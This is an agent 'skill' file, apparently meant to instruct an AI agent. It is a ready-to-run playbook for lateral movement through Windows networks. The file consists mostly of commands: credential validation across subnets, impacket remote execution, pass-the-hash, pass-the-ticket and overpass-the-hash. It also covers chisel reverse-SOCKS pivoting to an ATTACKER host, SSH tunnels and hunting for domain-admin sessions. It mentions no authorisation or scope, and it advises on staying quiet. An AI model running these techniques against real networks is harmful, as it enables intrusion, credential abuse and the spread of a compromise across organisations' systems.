---
name: lateral-movement
description: "Lateral movement in Windows environments: credential reuse, remote execution techniques, and pivoting between hosts. Use this skill after obtaining credentials on one host."
---

# Lateral Movement

## Overview

Move from host to host using credentials, hashes, tickets, or sessions. Choose the technique by what the target allows and what generates the least noise.

## Validate credentials

```bash
nxc smb 10.0.0.0/24 -u user -p pass
nxc smb 10.0.0.0/24 -u user -H <hash>
nxc winrm 10.0.0.0/24 -u user -p pass
```

## Remote execution

| Technique | Command | Port |
|---|---|---|
| PsExec | `impacket-psexec domain/u:p@host` | 445 |
| WMI | `impacket-wmiexec domain/u:p@host` | 135 |
| SMB exec | `impacket-smbexec domain/u:p@host` | 445 |
| At exec | `impacket-atexec domain/u:p@host cmd` | 445 |
| WinRM | `nxc winrm host -u u -p p -x whoami` | 5985 |
| RDP | `xfreerdp /v:host /u:u /p:p` | 3389 |
| SSH | `ssh user@host` | 22 |
| DCOM | `impacket-dcomexec domain/u:p@host` | 135 |

## Pass-the-hash

```bash
impacket-psexec -hashes :<nthash> domain.local/administrator@host
nxc smb host -u administrator -H <nthash> -x whoami
```

## Pass-the-ticket

```bash
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass domain.local/user@host
```

## Overpass-the-hash

Convert an NTLM hash to a Kerberos ticket:

```bash
impacket-getTGT domain.local/user -hashes :<nthash>
```

## Pivoting

```bash
# SOCKS through a compromised host
chisel server -p 8080 --reverse
# on target:
./chisel client ATTACKER:8080 R:socks
proxychains4 nxc smb 172.16.0.0/24 -u user -p pass

# ssh tunnel
ssh -D 1080 user@pivot
# port forward
ssh -L 3389:internal:3389 user@pivot
```

## Session hunting

```bash
nxc smb 10.0.0.0/24 -u user -p pass --sessions
# a DA session on a workstation = target it
```

## Pitfalls

- PsExec leaves a service and a binary on disk — noisy.
- WinRM requires the user to be in `Remote Management Users` or admin.
- EDR blocks credential dumping on protected hosts.

## Verification

Each hop must yield a working session as the intended principal.
